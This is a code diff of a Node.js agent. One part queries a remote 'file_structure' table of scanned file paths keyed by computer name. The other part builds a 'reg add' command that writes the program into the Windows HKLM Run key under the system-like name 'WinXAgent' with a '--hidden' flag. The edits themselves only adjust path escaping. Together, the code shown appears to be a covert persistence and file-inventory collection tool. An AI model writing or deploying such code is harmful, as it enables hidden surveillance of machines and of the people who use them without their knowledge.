@@ -102,9 +102,7 @@ async function scanDirectory(dirPath, foldersOnly = false) {
       .from('file_structure')
       .select('id, path')
       .eq('computer_name', COMPUTER_NAME)
-      // Use a more robust pattern matching for Windows paths
-      // We filter by computer_name first to leverage the index
-      .ilike('path', `${target.replace(/\\/g, '\\\\')}%`);
+      .ilike('path', `${target}%`); // PostgREST handles internal escaping for basic ilike
 
     if (fetchError) throw fetchError;
 
@@ -136,8 +134,12 @@ async function ensurePersistence(targetPath) {
   if (process.platform !== 'win32') return;
   
   const isCompiled = Boolean(process.pkg);
+  
+  // Normalize path to ensure no double slashes and correct separator for Windows
+  const cleanPath = path.resolve(targetPath);
+
   // Wrap path in quotes and escape them for shell command arguments (/d and /tr)
-  const cmd = isCompiled ? `"${targetPath}" --hidden` : `node "${targetPath}" --hidden`;
+  const cmd = isCompiled ? `"${cleanPath}" --hidden` : `node "${cleanPath}" --hidden`;
   const shellEscaped = cmd.replace(/"/g, '\\"');
 
   const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${shellEscaped}" /f`;
